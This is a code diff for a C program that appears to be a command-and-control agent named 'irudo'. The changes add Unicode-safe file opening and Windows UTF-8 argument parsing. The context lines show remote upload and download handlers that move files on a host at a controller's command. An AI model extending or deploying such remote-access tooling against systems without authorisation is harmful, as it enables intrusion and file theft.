@@ -81,7 +81,7 @@ static int parse_c2_address(const char *addr, char **host, int *port) {
 }
 
 static void load_config_file(const char *path, opts *o) {
-    FILE *f = fopen(path, "rb");
+    FILE *f = iru_fopen(path, "rb");
     if (!f) {
         fprintf(stderr, "[irudo] warning: cannot open config file: %s\n", path);
         return;
@@ -362,7 +362,7 @@ static int handle_upload(sockfd_t sock, bytebuf_t *inbuf, uint64_t req_id,
     }
     const char *dest = params[0];
     make_parent_dirs(dest);
-    FILE *f = fopen(dest, "wb");
+    FILE *f = iru_fopen(dest, "wb");
     if (!f) {
         char *err = printf_str("Error: cannot create file: %s", strerror(errno));
         send_response_pkt(sock, req_id, CMD_UPLOAD, err, strlen(err));
@@ -395,7 +395,7 @@ static int handle_upload(sockfd_t sock, bytebuf_t *inbuf, uint64_t req_id,
         send_response_pkt(sock, req_id, CMD_UPLOAD, msg, strlen(msg));
         free(msg);
     } else {
-        remove(dest);
+        iru_remove(dest);
         send_response_pkt(sock, req_id, CMD_UPLOAD, "Error: upload failed", 20);
     }
     return 0;
@@ -425,7 +425,7 @@ static int handle_download(sockfd_t sock, uint64_t req_id,
         tlv_free(params, n);
         return 0;
     }
-    FILE *f = fopen(src, "rb");
+    FILE *f = iru_fopen(src, "rb");
     if (!f) {
         char *err = printf_str("Error: cannot open source: %s", strerror(errno));
         send_response_pkt(sock, req_id, CMD_DOWNLOAD, err, strlen(err));
@@ -600,10 +600,41 @@ static int run(const opts *o) {
     return 0;
 }
 
+#ifdef _WIN32
+/* Windows hands main() ANSI argv, which corrupts non-ASCII arguments. Re-parse
+ * the UTF-16 command line and convert each argument to UTF-8 so a Chinese
+ * --config path / --agent-id works. The returned array lives for the process
+ * lifetime. */
+static int win_utf8_argv(int *out_argc, char ***out_argv) {
+    int n = 0;
+    wchar_t **wargv = CommandLineToArgvW(GetCommandLineW(), &n);
+    if (!wargv) return -1;
+    char **argv = (char **)calloc((size_t)n + 1, sizeof(char *));
+    if (!argv) { LocalFree(wargv); return -1; }
+    for (int i = 0; i < n; i++) {
+        char *u = wide_to_utf8(wargv[i]);
+        argv[i] = u ? u : xstrdup("");
+    }
+    argv[n] = NULL;
+    LocalFree(wargv);
+    *out_argc = n;
+    *out_argv = argv;
+    return 0;
+}
+#endif
+
 int main(int argc, char **argv) {
 #ifdef _WIN32
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
+    {
+        int wa = 0;
+        char **wv = NULL;
+        if (win_utf8_argv(&wa, &wv) == 0 && wa > 0) {
+            argc = wa;
+            argv = wv;
+        }
+    }
 #else
     signal(SIGPIPE, SIG_IGN);
 #endif
